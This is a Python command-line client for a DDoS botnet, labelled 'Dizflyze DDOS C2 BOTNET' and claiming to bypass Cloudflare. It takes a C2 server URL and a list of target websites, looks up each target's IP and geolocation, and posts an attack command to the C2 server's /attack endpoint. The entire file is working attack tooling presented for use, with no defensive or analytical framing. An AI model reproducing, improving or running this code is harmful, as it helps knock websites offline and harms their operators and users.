import os
import asyncio
import aiohttp
import requests
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

console = Console()

def L():
    os.system('cls' if os.name == 'nt' else 'clear')
    console.print(Panel.fit("""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣧
⠀⠀⠀⠀⠀⠀  ⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿  [ # ] Dizflyze
⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿  [ # ] DDOS
⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀⠂⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇ [ # ] Version : v1.3.2
⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋⠡⠁⠈⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿ [ # ] 26 MEI 2025
⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀⠐⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟
⠙⢹⣿⣿⣿⠿⠋⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    """, style="bold magenta"))
console.print(
    Panel.fit(
        "DDOS C2 BOTNET DIZ FLYZE ONLY BYPASS CLOUDFLARE",
        style="bold yellow",
        padding=(1, 2),
        subtitle_align="center"
    ),
    justify="center"
)

def NU(user_input):
    if not user_input.startswith('http'):
        user_input = 'https://' + user_input
    parsed = requests.utils.urlparse(user_input)
    if not parsed.netloc:
        parsed = parsed._replace(netloc=parsed.path, path='')
    return requests.utils.urlunparse(parsed)

async def fetch_info(session, target):
    parsed = requests.utils.urlparse(target)
    domain = parsed.netloc
    if not domain:
        domain = parsed.path
    import socket
    try:
        ip = socket.gethostbyname(domain)
    except:
        return None
    url = f"http://ip-api.com/json/{ip}"
    try:
        async with session.get(url) as resp:
            if resp.status != 200:
                return None
            return await resp.json()
    except:
        return None

async def attack_target(session, api_url, target):
    try:
        async with session.post(f"{api_url}/attack", json={"target": target, "apiKey": "TERMUX_KEY"}) as resp:
            if resp.status != 200:
                return False
            return True
    except:
        return False

async def process_target(session, api_url, target):
    info = await fetch_info(session, target)
    if not info:
        console.print(f"[red]Gagal mendapatkan info target: {target}[/red]")
        return
    table = Table(title=f"Info {target}")
    table.add_column("Field", style="cyan")
    table.add_column("Value", style="magenta")
    for k, v in info.items():
        table.add_row(str(k), str(v))
    console.print(table)
    choice = console.input(f"Serang target {target}? (y/n): ")
    if choice.lower() == 'y':
        success = await attack_target(session, api_url, target)
        if success:
            console.print(f"[green]Serangan ke {target} berhasil![/green]")
        else:
            console.print(f"[red]Gagal serang {target}[/red]")

async def main():
    L()
    api_url = console.input("[white]API URL (ngrok): [/white]").strip()
    targets_input = console.input("[white]Target(s) (pisahkan koma): [/white]").strip()
    targets = [NU(t.strip()) for t in targets_input.split(',')]
    async with aiohttp.ClientSession() as session:
        tasks = [process_target(session, api_url, t) for t in targets]
        await asyncio.gather(*tasks)

if __name__ == '__main__':
    asyncio.run(main())
